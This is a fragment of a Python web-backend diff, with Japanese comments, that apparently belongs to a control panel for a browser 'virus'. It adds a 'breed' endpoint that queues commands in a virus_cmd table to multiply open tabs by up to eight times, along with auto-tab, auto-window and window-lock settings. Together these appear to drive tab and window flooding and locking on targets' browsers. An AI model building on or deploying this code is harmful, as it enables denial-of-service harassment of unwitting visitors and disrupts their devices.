+            v = 0
+        if dst == "on":
+            auto_on = v
+        elif dst == "tab":
+            auto_tab = v
+        else:
+            auto_win = v
     c.close()
     fixed = _is_fixed(row)
     return {"ok": 1, "code": code,
@@ -1474,6 +1484,8 @@ def _api_state(owner, code):
             "win_depth": int(_val(row, "win_depth", 0) or 0),
             "hard": _val(row, "hard", "") or "",
             "ver": _val(row, "ver", "") or _SG_VER,
+            "live": live, "auto_on": auto_on,
+            "auto_tab": auto_tab, "auto_win": auto_win,
             "hits": hn, "pending": pend, "server": _now()}
 
 
@@ -1659,7 +1671,27 @@ def api_cmd_clear(code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
-# --- 窓増殖 / 絶滅（特異点） ---
+# --- 窓増殖 / タブ増殖 / 絶滅（特異点） ---
+
+@router.post("/api/vp/{code}/breed")
+async def api_breed(request: Request, code: str, u=Depends(_auth)):
+    """タブ増殖。mult = 2 / 3 / 4 …（現在の生存タブ数の (mult-1) 倍を追加）"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    try:
+        m = max(2, min(8, int(b.get("mult") or 2)))
+    except Exception:
+        m = 2
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
+              (code, "", "breed", str(m), _now()))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
 
 @router.post("/api/vp/{code}/winlock")
 async def api_winlock(request: Request, code: str, u=Depends(_auth)):
